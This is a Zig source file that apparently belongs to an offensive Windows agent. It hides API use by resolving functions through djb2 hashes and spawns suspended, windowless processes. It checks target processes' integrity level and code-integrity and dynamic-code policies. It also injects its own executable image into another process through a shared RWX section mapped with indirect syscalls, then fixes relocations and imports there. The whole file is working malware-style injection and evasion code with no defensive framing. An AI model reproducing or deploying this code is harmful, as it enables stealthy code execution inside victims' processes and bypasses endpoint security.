const std = @import("std");
const api = @import("api.zig");
const syscalls = @import("syscalls.zig");
const crypto = @import("crypto.zig");

const CREATE_SUSPENDED: u32 = 0x00000004;
const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn spawnSuspendedProcess(path_w: [*:0]const u16) !api.PROCESS_INFORMATION {
    var si = std.mem.zeroes(api.STARTUPINFOW);
    si.cb = @sizeOf(api.STARTUPINFOW);
    var pi = std.mem.zeroes(api.PROCESS_INFORMATION);

    const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
    const k32_base = api.getModuleHandleByHash(k32_hash) orelse return error.K32NotFound;
    
    const CreateProcessWFn = *const fn(?[*:0]const u16, ?[*:0]u16, ?*anyopaque, ?*anyopaque, i32, u32, ?*anyopaque, ?[*:0]const u16, *api.STARTUPINFOW, *api.PROCESS_INFORMATION) callconv(.winapi) i32;
    const CreateProcessW = @as(CreateProcessWFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateProcessW")) orelse return error.CPWNotFound));

    if (CreateProcessW(null, @constCast(path_w), null, null, 0, CREATE_SUSPENDED | CREATE_NO_WINDOW, null, null, &si, &pi) == 0) {
        return error.CreateProcessFailed;
    }

    return pi;
}

pub fn getProcessInfo(pid: u32, arena: std.mem.Allocator, logFunc: *const fn(std.mem.Allocator, []const u8) void) ![]const u8 {
    const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
    const k32_base = api.getModuleHandleByHash(k32_hash) orelse return error.K32NotFound;
    
    const OpenProcess = @as(api.OpenProcessFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("OpenProcess")) orelse return error.OPNotFound));
    const CloseHandle = @as(*const fn(?*anyopaque) callconv(.winapi) i32, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CloseHandle")) orelse return error.CHNotFound));

    const kernelbase_base = api.getModuleHandleByHash(comptime crypto.djb2_i("KERNELBASE.DLL")) orelse return error.KernelbaseNotFound;
    const GetProcessMitigationPolicy = @as(api.GetProcessMitigationPolicyFn, @ptrCast(api.getProcAddressByHash(kernelbase_base, comptime crypto.djb2("GetProcessMitigationPolicy")) orelse return error.GPMPNotFound));

    const LoadLibraryA = @as(api.LoadLibraryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("LoadLibraryA")) orelse return error.LLANotFound));
    
    const advapi_base = if (api.getModuleHandleByHash(comptime crypto.djb2_i("ADVAPI32.DLL"))) |h| h else LoadLibraryA("advapi32.dll") orelse return error.AdvapiNotFound;
    const OpenProcessToken = @as(api.OpenProcessTokenFn, @ptrCast(api.getProcAddressByHash(advapi_base, comptime crypto.djb2("OpenProcessToken")) orelse return error.OPTNotFound));
    const GetTokenInformation = @as(api.GetTokenInformationFn, @ptrCast(api.getProcAddressByHash(advapi_base, comptime crypto.djb2("GetTokenInformation")) orelse return error.GTINotFound));
    const GetSidSubAuthorityCount = @as(api.GetSidSubAuthorityCountFn, @ptrCast(api.getProcAddressByHash(advapi_base, comptime crypto.djb2("GetSidSubAuthorityCount")) orelse return error.GSACNotFound));
    const GetSidSubAuthority = @as(api.GetSidSubAuthorityFn, @ptrCast(api.getProcAddressByHash(advapi_base, comptime crypto.djb2("GetSidSubAuthority")) orelse return error.GSANotFound));

    logFunc(arena, "Trace: Attempting OpenProcess (QueryInfo)...");
    var hProcess = OpenProcess(api.PROCESS_QUERY_INFORMATION, 0, pid);
    if (hProcess == null) {
        logFunc(arena, "Trace: OpenProcess(QueryInfo) denied, falling back to Limited...");
        hProcess = OpenProcess(api.PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
    }
    
    const h = hProcess orelse return error.OpenProcessFailed;
    defer _ = CloseHandle(h);

    var integrity: []const u8 = "unknown";
    var is_elevated: bool = false;
    const diag: []const u8 = "OK";

    var hToken: ?*anyopaque = null;
    if (OpenProcessToken(h, api.TOKEN_QUERY, &hToken) != 0) {
        defer _ = CloseHandle(hToken);

        var elevation = std.mem.zeroes(api.TOKEN_ELEVATION);
        var size: u32 = @sizeOf(api.TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, .TokenElevation, &elevation, size, &size) != 0) {
            is_elevated = elevation.TokenIsElevated != 0;
        }

        var il_size: u32 = 0;
        _ = GetTokenInformation(hToken, .TokenIntegrityLevel, null, 0, &il_size);
        if (il_size > 0) {
            const il_buf = arena.alloc(u8, il_size) catch return error.OutOfMemory;
            const tml = @as(*api.TOKEN_MANDATORY_LABEL, @ptrCast(@alignCast(il_buf.ptr)));
            if (GetTokenInformation(hToken, .TokenIntegrityLevel, tml, il_size, &il_size) != 0) {
                if (tml.Label.Sid) |sid| {
                    if (GetSidSubAuthorityCount(sid)) |count_ptr| {
                        const sub_auth_count = count_ptr.*;
                        if (sub_auth_count > 0) {
                            if (GetSidSubAuthority(sid, @as(u32, sub_auth_count) - 1)) |rid_ptr| {
                                const rid = rid_ptr.*;
                                integrity = if (rid >= 0x4000) "System" else if (rid >= 0x3000) "High" else if (rid >= 0x2000) "Medium" else "Low";
                            }
                        }
                    }
                }
            }
        }
    }

    var cig: bool = false;
    var sig_policy = std.mem.zeroes(api.PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY);
    if (GetProcessMitigationPolicy(h, @enumFromInt(@as(u32, 8)), &sig_policy, @sizeOf(api.PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY)) != 0) {
        cig = (sig_policy.Flags & 0x01) != 0;
    }

    var acg: bool = false;
    var dyn_policy = std.mem.zeroes(api.PROCESS_MITIGATION_DYNAMIC_CODE_POLICY);
    if (GetProcessMitigationPolicy(h, @enumFromInt(@as(u32, 2)), &dyn_policy, @sizeOf(api.PROCESS_MITIGATION_DYNAMIC_CODE_POLICY)) != 0) {
        acg = (dyn_policy.Flags & 0x01) != 0;
    }

    return std.fmt.allocPrint(arena, "{{\"integrity\":\"{s}\",\"is_elevated\":{},\"cig\":{},\"acg\":{},\"diag\":\"{s}\"}}", .{integrity, is_elevated, cig, acg, diag}) catch error.OutOfMemory;
}

pub fn manualMap(    arena: std.mem.Allocator,
    logFunc: *const fn(std.mem.Allocator, []const u8) void,
    hProcess: ?*anyopaque,
    nt_create_section_ssn: u32,
    nt_map_view_of_section_ssn: u32,
    nt_duplicate_object_ssn: u32,
    nt_write_ssn: u32,
    gadget: usize,
) !usize {
    logFunc(arena, "ManualMap: Starting direct reflective injection of self image...");
    _ = nt_write_ssn;

    // 0. Verify Architecture
    const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
    const k32_base = api.getModuleHandleByHash(k32_hash) orelse return error.K32NotFound;
    const IsWow64Process = @as(api.IsWow64ProcessFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("IsWow64Process")) orelse return error.IW64_NotFound));
    const LoadLibraryA = @as(api.LoadLibraryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("LoadLibraryA")) orelse return error.LLA_NotFound));
    const GetProcAddress = @as(api.GetProcAddressFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetProcAddress")) orelse return error.GPA_NotFound));

    var is_wow64: i32 = 0;
    _ = IsWow64Process(hProcess, &is_wow64);
    if (is_wow64 != 0) {
        logFunc(arena, "ManualMap: Error: Target process is 32-bit (WOW64). Cannot inject 64-bit agent.");
        return error.ArchitectureMismatch;
    }

    // 1. Get our own executable path and read it
    const GetModuleFileNameA = @as(*const fn(?*anyopaque, [*]u8, u32) callconv(.winapi) u32, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetModuleFileNameA")) orelse return error.GMFNA_NotFound));
    const CreateFileA = @as(api.CreateFileAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateFileA")) orelse return error.CFA_NotFound));
    const ReadFile = @as(*const fn(?*anyopaque, [*]u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("ReadFile")) orelse return error.RF_NotFound));
    const CloseHandle = @as(api.CloseHandleFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CloseHandle")) orelse return error.CH_NotFound));
    const GetFileSize = @as(*const fn(?*anyopaque, ?*u32) callconv(.winapi) u32, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetFileSize")) orelse return error.GFS_NotFound));

    var path_buf: [api.MAX_PATH]u8 = undefined;
    const path_len = GetModuleFileNameA(null, &path_buf, api.MAX_PATH);
    if (path_len == 0) return error.GetModuleFileNameFailed;
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Reading self image from {s}...", .{path_buf[0..path_len]}) catch "");

    const hFile = CreateFileA(path_buf[0..path_len + 1 :0].ptr, api.GENERIC_READ, api.FILE_SHARE_READ, null, api.OPEN_EXISTING, api.FILE_ATTRIBUTE_NORMAL, null);
    if (hFile == api.INVALID_HANDLE_VALUE) {
        logFunc(arena, "ManualMap: Error: Failed to open self image file.");
        return error.OpenFileFailed;
    }
    defer _ = CloseHandle(hFile);

    const file_size = GetFileSize(hFile, null);
    if (file_size == 0xFFFFFFFF) {
        logFunc(arena, "ManualMap: Error: Failed to get file size.");
        return error.GetFileSizeFailed;
    }
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: File size is {d} bytes.", .{file_size}) catch "");

    const pe_buffer = try arena.alloc(u8, file_size);
    var bytes_read: u32 = 0;
    if (ReadFile(hFile, pe_buffer.ptr, file_size, &bytes_read, null) == 0) {
        logFunc(arena, "ManualMap: Error: Failed to read file content.");
        return error.ReadFileFailed;
    }
    logFunc(arena, "ManualMap: Self image read into local buffer.");

    // 2. Parse PE Headers
    const dos_header: *api.IMAGE_DOS_HEADER = @ptrCast(@alignCast(pe_buffer.ptr));
    if (dos_header.e_magic != 0x5A4D) {
        logFunc(arena, "ManualMap: Error: Invalid DOS magic.");
        return error.InvalidDosHeader;
    }
    const nt_headers: *api.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(pe_buffer.ptr + dos_header.e_lfanew));
    if (nt_headers.Signature != 0x00004550) {
        logFunc(arena, "ManualMap: Error: Invalid NT signature.");
        return error.InvalidNtHeaders;
    }

    const image_size = nt_headers.OptionalHeader.SizeOfImage;
    const preferred_base = nt_headers.OptionalHeader.ImageBase;
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: PE Parsed. ImageSize=0x{x}, EntryPoint=0x{x}, PreferredBase=0x{x}", .{image_size, nt_headers.OptionalHeader.AddressOfEntryPoint, preferred_base}) catch "");

    // 3. Create Shared Section
    var hSection: ?*anyopaque = null;
    var max_size: u64 = image_size;
    const create_args = [_]usize{ @intFromPtr(&hSection), api.SECTION_ALL_ACCESS, 0, @intFromPtr(&max_size), api.PAGE_EXECUTE_READWRITE, api.SEC_COMMIT, 0 };
    const status_section = syscalls.doSyscall(nt_create_section_ssn, gadget, &create_args);
    if (status_section != 0 or hSection == null) {
        logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Error: NtCreateSection failed with status 0x{x}", .{status_section}) catch "Section fail");
        return error.CreateSectionFailed;
    }
    logFunc(arena, "ManualMap: Shared section created successfully.");

    // 4. Map Remotely (to get base address)
    var remote_base: usize = 0;
    var remote_view_size: usize = 0;
    const map_args_remote = [_]usize{ @intFromPtr(hSection), @intFromPtr(hProcess), @intFromPtr(&remote_base), 0, 0, 0, @intFromPtr(&remote_view_size), api.ViewUnmap, 0, api.PAGE_EXECUTE_READWRITE };
    const status_remote = syscalls.doSyscall(nt_map_view_of_section_ssn, gadget, &map_args_remote);
    if (status_remote != 0 or remote_base == 0) {
        logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Error: NtMapViewOfSection (Remote) failed with status 0x{x}", .{status_remote}) catch "Remote map fail");
        return error.MapRemoteFailed;
    }
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Section mapped remotely at 0x{x}", .{remote_base}) catch "");

    // 5. Map Locally (to patch)
    var local_base: usize = 0;
    var local_view_size: usize = 0;
    const current_process: ?*anyopaque = @ptrFromInt(std.math.maxInt(usize));
    const map_args_local = [_]usize{ @intFromPtr(hSection), @intFromPtr(current_process), @intFromPtr(&local_base), 0, 0, 0, @intFromPtr(&local_view_size), api.ViewUnmap, 0, api.PAGE_READWRITE };
    const status_local = syscalls.doSyscall(nt_map_view_of_section_ssn, gadget, &map_args_local);
    if (status_local != 0 or local_base == 0) {
        logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Error: NtMapViewOfSection (Local) failed with status 0x{x}", .{status_local}) catch "Local map fail");
        return error.MapLocalFailed;
    }
    const mapped_buffer: [*]u8 = @ptrFromInt(local_base);
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Section mapped locally at 0x{x} for patching.", .{local_base}) catch "");

    // 6. Copy Headers & Sections correctly into mapped view
    logFunc(arena, "ManualMap: Copying headers and sections...");
    @memset(mapped_buffer[0..image_size], 0);
    @memcpy(mapped_buffer[0..nt_headers.OptionalHeader.SizeOfHeaders], pe_buffer[0..nt_headers.OptionalHeader.SizeOfHeaders]);

    const section_header_ptr = @as([*]api.IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(&nt_headers.OptionalHeader) + nt_headers.FileHeader.SizeOfOptionalHeader));
    var i: u16 = 0;
    while (i < nt_headers.FileHeader.NumberOfSections) : (i += 1) {
        const section = section_header_ptr[i];
        if (section.SizeOfRawData > 0) {
            logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Copying section {s} (0x{x} -> 0x{x}, size 0x{x})", .{section.Name, section.PointerToRawData, section.VirtualAddress, section.SizeOfRawData}) catch "");
            const src = pe_buffer[section.PointerToRawData..section.PointerToRawData + section.SizeOfRawData];
            const dst = mapped_buffer[section.VirtualAddress..section.VirtualAddress + section.SizeOfRawData];
            @memcpy(dst, src);
        }
    }

    // 7. Fix Relocations (directly in shared memory)
    const delta = @as(i64, @bitCast(remote_base)) -% @as(i64, @bitCast(preferred_base));
    if (delta != 0) {
        logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Relocating image (delta=0x{x})...", .{@as(u64, @bitCast(delta))}) catch "");
        const reloc_dir = nt_headers.OptionalHeader.DataDirectory[5]; // Base Relocation Table
        if (reloc_dir.VirtualAddress != 0) {
            var curr_reloc_ptr = mapped_buffer + reloc_dir.VirtualAddress;
            const end_reloc_ptr = curr_reloc_ptr + reloc_dir.Size;
            var block_count: usize = 0;

            while (@intFromPtr(curr_reloc_ptr) < @intFromPtr(end_reloc_ptr)) {
                const reloc: *api.IMAGE_BASE_RELOCATION = @ptrCast(@alignCast(curr_reloc_ptr));
                if (reloc.SizeOfBlock == 0) break;

                const entries_count = (reloc.SizeOfBlock - @sizeOf(api.IMAGE_BASE_RELOCATION)) / 2;
                const entries = @as([*]u16, @ptrFromInt(@intFromPtr(curr_reloc_ptr) + @sizeOf(api.IMAGE_BASE_RELOCATION)));
                block_count += 1;

                var j: u32 = 0;
                while (j < entries_count) : (j += 1) {
                    const type_offset = entries[j];
                    const rel_type = type_offset >> 12;
                    const rel_offset = type_offset & 0xFFF;
                    if (rel_type == 10) { // IMAGE_REL_BASED_DIR64
                        const patch_ptr = @as(*u64, @ptrCast(@alignCast(mapped_buffer + reloc.VirtualAddress + rel_offset)));
                        patch_ptr.* = @as(u64, @bitCast(@as(i64, @bitCast(patch_ptr.*)) +% delta));
                    }
                }
                curr_reloc_ptr += reloc.SizeOfBlock;
            }
            logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Relocation complete. Patched {d} blocks.", .{block_count}) catch "");
        }
    } else {
        logFunc(arena, "ManualMap: Delta is 0, skipping relocations.");
    }

    // 8. Resolve Imports (Robust: handles forwarders)
    logFunc(arena, "ManualMap: Resolving imports (Basic: kernel32/ntdll/advapi)...");
    const import_dir = nt_headers.OptionalHeader.DataDirectory[1];
    if (import_dir.VirtualAddress != 0) {
        var import_desc = @as(*api.IMAGE_IMPORT_DESCRIPTOR, @ptrCast(@alignCast(mapped_buffer + import_dir.VirtualAddress)));
        while (import_desc.Name != 0) {
            const mod_name = @as([*:0]u8, @ptrCast(mapped_buffer + import_desc.Name));
            logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Resolving imports for module: {s}", .{mod_name}) catch "");
            
            const hMod = LoadLibraryA(mod_name);
            if (hMod != null) {
                var thunk = @as(*api.IMAGE_THUNK_DATA64, @ptrCast(@alignCast(mapped_buffer + import_desc.FirstThunk)));
                var orig_thunk = @as(*api.IMAGE_THUNK_DATA64, @ptrCast(@alignCast(mapped_buffer + (if (import_desc.OriginalFirstThunk != 0) import_desc.OriginalFirstThunk else import_desc.FirstThunk))));
                var func_count: usize = 0;
                while (orig_thunk.u1.AddressOfData != 0) {
                    if ((orig_thunk.u1.Ordinal & (@as(u64, 1) << 63)) == 0) {
                        const import_by_name = @as(*api.IMAGE_IMPORT_BY_NAME, @ptrCast(@alignCast(mapped_buffer + orig_thunk.u1.AddressOfData)));
                        const func_name = @as([*c]const u8, @ptrCast(&import_by_name.Name));
                        if (GetProcAddress(hMod, func_name)) |addr| {
                            thunk.u1.Function = @intFromPtr(addr);
                            func_count += 1;
                        }
                    } else {
                        const ordinal = orig_thunk.u1.Ordinal & 0xFFFF;
                        if (GetProcAddress(hMod, @as([*c]const u8, @ptrFromInt(ordinal)))) |addr| {
                            thunk.u1.Function = @intFromPtr(addr);
                            func_count += 1;
                        }
                    }
                    thunk = @as(*api.IMAGE_THUNK_DATA64, @ptrFromInt(@intFromPtr(thunk) + @sizeOf(api.IMAGE_THUNK_DATA64)));
                    orig_thunk = @as(*api.IMAGE_THUNK_DATA64, @ptrFromInt(@intFromPtr(orig_thunk) + @sizeOf(api.IMAGE_THUNK_DATA64)));
                }
                logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Resolved {d} functions for {s}.", .{func_count, mod_name}) catch "");
            } else {
                logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Warning: Module {s} not found in agent. Imports may fail.", .{mod_name}) catch "");
            }
            import_desc = @as(*api.IMAGE_IMPORT_DESCRIPTOR, @ptrFromInt(@intFromPtr(import_desc) + @sizeOf(api.IMAGE_IMPORT_DESCRIPTOR)));
        }
    }

    // 9. Cleanup local view and section handle
    logFunc(arena, "ManualMap: Unmapping local view and closing section handles...");
    const ntdll_base = api.getModuleHandleByHash(comptime crypto.djb2_i("NTDLL.DLL")) orelse return error.NtdllNotFound;
    const nt_unmap_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtUnmapViewOfSection")) catch return error.SsnNotFound;
    const unmap_args = [_]usize{ @intFromPtr(current_process), local_base };
    _ = syscalls.doSyscall(nt_unmap_ssn, gadget, &unmap_args);

    var hDup: ?*anyopaque = null;
    const dup_args = [_]usize{ @intFromPtr(current_process), @intFromPtr(hSection), @intFromPtr(current_process), @intFromPtr(&hDup), 0, 0, api.DUPLICATE_CLOSE_SOURCE };
    _ = syscalls.doSyscall(nt_duplicate_object_ssn, gadget, &dup_args);

    const remote_entry = remote_base + nt_headers.OptionalHeader.AddressOfEntryPoint;
    logFunc(arena, std.fmt.allocPrint(arena, "ManualMap: Complete. Remote entry point at 0x{x}", .{remote_entry}) catch "");
    return remote_entry;
}

